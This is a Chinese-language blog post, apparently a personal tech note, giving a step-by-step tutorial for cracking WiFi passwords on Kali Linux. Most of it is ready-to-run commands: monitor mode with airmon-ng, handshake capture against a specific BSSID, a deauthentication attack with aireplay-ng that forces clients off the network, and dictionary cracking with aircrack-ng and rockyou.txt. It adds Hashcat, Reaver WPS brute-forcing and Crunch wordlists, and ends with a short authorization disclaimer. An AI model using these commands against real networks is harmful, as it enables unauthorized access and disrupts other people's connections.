---
title: Linux 破解 WiFi
date: 2026-11-18
slug: linux-wifi-cracking
category: it
subcategory: linux
tags:
  - linux
  - security
summary: 记录在 Kali Linux 下使用常见工具进行 WiFi 安全测试的准备和操作步骤。
status: published
---

## 一、准备工作

1. **安装 Kali Linux**：

    - 下载最新的 [Kali Linux](https://link.zhihu.com/?target=https%3A//www.kali.org/get-kali/) ISO 镜像文件，并将其安装在虚拟机或物理机上。
    - 安装时，选择完整安装，确保网络安全工具包括 `aircrack-ng` 套件。

2. **硬件要求**：

    - **无线网卡**：必须支持**监控模式**和**包注入**，推荐使用像 Alfa AWUS036NH 之类的高性能网卡。

3. **更新 Kali Linux**：

    - 确保系统和工具是最新的：

    

    【注意！！！！】这个是把整个kali都更新了

    ```sh
    sudo apt update && sudo apt upgrade -y
    ```



## 二、工具概述

- **Aircrack-ng**：这是一个用于网络监控、捕获数据包、密钥破解的 Wi-Fi 破解工具集。
- **[Airmon-ng](https://zhida.zhihu.com/search?content_id=248952098&content_type=Article&match_order=1&q=Airmon-ng&zhida_source=entity)**：将无线网卡置于监控模式。
- **[Airodump-ng](https://zhida.zhihu.com/search?content_id=248952098&content_type=Article&match_order=1&q=Airodump-ng&zhida_source=entity)**：用于捕获 Wi-Fi 网络的数据包。
- **[Aireplay-ng](https://zhida.zhihu.com/search?content_id=248952098&content_type=Article&match_order=1&q=Aireplay-ng&zhida_source=entity)**：注入网络包进行干扰或欺骗攻击，常用于解除客户端的连接（deauth）。
- **Aircrack-ng**：通过字典破解捕获到的握手包，获取 Wi-Fi 密码。

---



## 三、详细步骤

#### 下载无线网卡

#### 1. 将无线网卡切换为监控模式

Kali Linux 默认网卡工作在管理模式下（不捕获流量）。使用 `airmon-ng` 启动监控模式：

```sh
sudo airmon-ng start wlan0
```

- `wlan0` 是你的无线网卡接口名称，可以通过 `ifconfig` 查看。

- 如果看到错误提示与**进程冲突**，可使用以下命令杀死冲突进程：

    ```sh
    sudo airmon-ng check kill
    
    # 启动 NetworkManager
    sudo systemctl start NetworkManager
    
    # 之后重新
    sudo airmon-ng start wlan0
    ```



>`airmon-ng check kill` 的作用
>
>它会杀死以下进程：
>
>`NetworkManager`  管理网络连接（WiFi/有线）
>
>`wpa_supplicant`  WiFi 认证连接
>
>`dhclient`  DHCP 获取 IP
>
>这些进程被 `airmon-ng check kill` 杀掉后，需要手动启动才能恢复 WiFi 连接功能。

检查：

```sh
# 检查 NetworkManager 状态
systemctl status NetworkManager

# 检查 wpa_supplicant 是否在运行
ps aux | grep wpa_supplicant

# 检查 dhclient 是否在运行
ps aux | grep dhclient
```



#### 2. 扫描周围的 Wi-Fi 网络

使用 `airodump-ng` 来扫描周围的 Wi-Fi 网络：

```sh
sudo airodump-ng wlan0
```

此命令会显示：

- BSSID：路由器的 MAC 地址。
- PWR：信号强度。
- CH：信道（Channel）。
- ENC：加密类型（如 WPA、WPA2）。
- ESSID：Wi-Fi 网络名称。

![截图_2024-09-27_13-32-23](https://pica.zhimg.com/v2-33e9e02052addf660ce687dbfa58de14_1440w.jpg)

找到目标之后，**按 Ctrl+C 停止扫描**。



#### 3. 选择目标 Wi-Fi 网络并捕获握手包

找到目标 Wi-Fi 网络后，记下其 BSSID 和信道，然后**新开一个终端窗口**执行（不要关闭扫描窗口）。

建议新建文件夹，方便管理生成的文件。

```sh
mkdir -p ~/wifi_capture

# 注意看文件保存的位置
sudo airodump-ng --bssid B4:7C:A6:7D:7E:02 --channel 3 -w ~/wifi_capture/capture wlan0
```



【常规教程】运行以下命令开始捕获握手包：

```sh
sudo airodump-ng --bssid [目标BSSID] --channel [信道] -w [保存文件名] wlan0

# 例如：
sudo airodump-ng --bssid B4:7C:A6:7D:7E:02 --channel 3 -w ~/capture wlan0
```

- `--bssid` 后跟目标 Wi-Fi 的 BSSID。
- `--channel` 后跟信道号。
- `-w` 表示保存握手包的文件名。

![截图_2024-09-27_14-04-58](https://pic1.zhimg.com/v2-f5e72975b6c0d9f2a29968b3b226320a_1440w.jpg)

【注意，窗口不要关】这个命令会捕获目标 Wi-Fi 网络上的数据包，**直到**捕获到握手包。



#### 4. 强制客户端重新连接（Deauthentication 攻击）

不要关闭捕获握手包，重新开一个窗口进行攻击

如果在捕获过程中没有用户连接到 Wi-Fi 或没有获取到握手包，可以使用 `aireplay-ng` 发送断开（deauth）请求，强制客户端重新连接，以便捕获握手包：

```text
sudo aireplay-ng --deauth 10 -a [路由器mac地址] -c [客户端mac地址] wlan0mon
```

- `--deauth 10` 意思是发送 10 个 deauth 包，10 是可调的数字，代表包的数量。
- `-a` 路由器 mac 地址 。
- `-c` 客户端 mac 地址。

例子：

#### 5. 检查是否成功捕获握手包

当客户端重新连接时，`airodump-ng` 窗口的右上角会提示 `WPA handshake: [目标BSSID]`，表示已成功捕获握手包。握手包会保存在你指定的 `.cap` 文件中。



![捕获握手包成功](https://pic2.zhimg.com/v2-9270d207cb932066f5df37411460e437_1440w.jpg)

#### 6. 使用字典文件破解 Wi-Fi 密码

握手包捕获完成后，接下来使用 `aircrack-ng` 工具来破解 Wi-Fi 密码。你需要一个包含常见密码的字典文件。网络上有很多常用的字典文件，推荐使用 `rockyou.txt`，它通常位于 `/usr/share/wordlists/` 中：

```text
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [目标BSSID] [捕获文件名].cap
```

- `-w` 后跟字典文件的路径。
- `-b` 后跟目标 Wi-Fi 的 BSSID。
- `捕获文件名.cap` 是你之前保存的握手包文件。

破解过程可能需要一些时间，具体取决于密码的复杂性和字典文件的大小。

#### 7. 破解成功

如果目标 Wi-Fi 的密码在字典文件中，`aircrack-ng` 将输出 Wi-Fi 密码。你可以使用该密码连接到 Wi-Fi 网络。



![截图_2024-09-27_15-03-39](https://pic2.zhimg.com/v2-c7f4cd3f2503602cca96ea53a6ae256d_1440w.jpg)



## iw 监控

## 设置监控模式

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo iw dev wlan0 info
```





---

### 四、进阶工具和技巧

1. **[Hashcat](https://zhida.zhihu.com/search?content_id=248952098&content_type=Article&match_order=1&q=Hashcat&zhida_source=entity)**：
    Hashcat 是一个更强大的密码破解工具，它支持 GPU 加速，可以大幅加快破解速度。使用 Hashcat 破解 WPA2 密码需要将 `.cap` 文件转换为 Hashcat 支持的格式：

    ```text
    hcxpcapngtool -o hashcat.hccapx [捕获文件名].cap
    ```

    然后使用 Hashcat 进行破解：

    ```text
    hashcat -m 2500 hashcat.hccapx /path/to/wordlist.txt
    ```

2. **Reaver（针对 WPS 漏洞）** ：
    如果目标 Wi-Fi 网络启用了 WPS 功能，你可以使用 `Reaver` 工具来尝试暴力破解 WPS PIN，从而绕过 WPA/WPA2 加密：

    ```text
    sudo reaver -i wlan0mon -b [目标BSSID] -vv
    ```

    这个方法对于没有禁用 WPS 的路由器特别有效。

3. **字典生成器**：
    如果默认字典文件不足以破解密码，可以使用 `Crunch` 工具来生成符合特定模式的字典文件：

    ```text
    crunch 8 10 abcdefghijklmnopqrstuvwxyz -o custom_wordlist.txt
    ```

    该命令生成一个由 8 到 10 位的小写字母组成的字典文件。

### 五、重要的注意事项

1. **合法性**：
    你必须对目标网络拥有明确的授权。未经授权的 Wi-Fi 渗透测试是非法的，可能导致严重的法律后果。
2. **加密方式**：
    使用 WPA3 加密的网络非常难以破解，目前没有有效的公开方法来破解 WPA3。
3. **复杂性**：
    破解时间取决于密码的复杂性和字典的质量。较强的密码可能需要很长时间甚至无法破解。
